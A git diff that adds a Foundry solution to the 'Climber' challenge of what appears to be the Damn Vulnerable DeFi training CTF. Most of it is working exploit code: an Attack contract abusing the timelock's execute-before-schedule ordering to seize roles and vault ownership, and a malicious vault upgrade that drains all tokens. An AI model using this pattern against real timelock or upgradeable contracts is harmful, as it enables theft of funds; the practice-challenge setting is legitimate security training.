@@ -7,6 +7,7 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -84,7 +85,13 @@ contract ClimberChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_climber() public checkSolvedByPlayer {}
+    function test_climber() public checkSolvedByPlayer {
+        Attack attack = new Attack(payable(timelock), address(vault));
+        attack.timelockExecute();
+        MaliciousClimberVault newVaultImpl = new MaliciousClimberVault();
+        vault.upgradeToAndCall(address(newVaultImpl),"");
+        MaliciousClimberVault(address(vault)).withdrawAll(address(token),recovery);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -94,3 +101,47 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+contract Attack {
+    address payable private immutable timelock;
+
+    uint256[] private values = [0, 0, 0, 0];
+    address[] private targets = new address[](4);
+    bytes[] private elements = new bytes[](4);
+    bytes32 private constant salt = keccak256("attack");
+
+    constructor(address payable _timelock, address _vault) {
+        timelock = _timelock;
+        address vault = _vault;
+        targets = [_timelock, _timelock, vault, address(this)];
+
+        elements[0] = (
+            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
+        );
+        elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
+        elements[3] = abi.encodeWithSignature("timelockSchedule()");
+    }
+
+    function timelockExecute() external {
+        ClimberTimelock(timelock).execute(targets, values, elements, salt);
+    }
+
+    function timelockSchedule() external {
+        ClimberTimelock(timelock).schedule(targets, values, elements, salt);
+    }
+}
+
+contract MaliciousClimberVault is ClimberVault {
+/// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+        _disableInitializers();
+    }
+    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
+        // withdraw the whole token balance from the contract
+        DamnValuableToken token = DamnValuableToken(tokenAddress);
+        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
+    }
+}
+
+
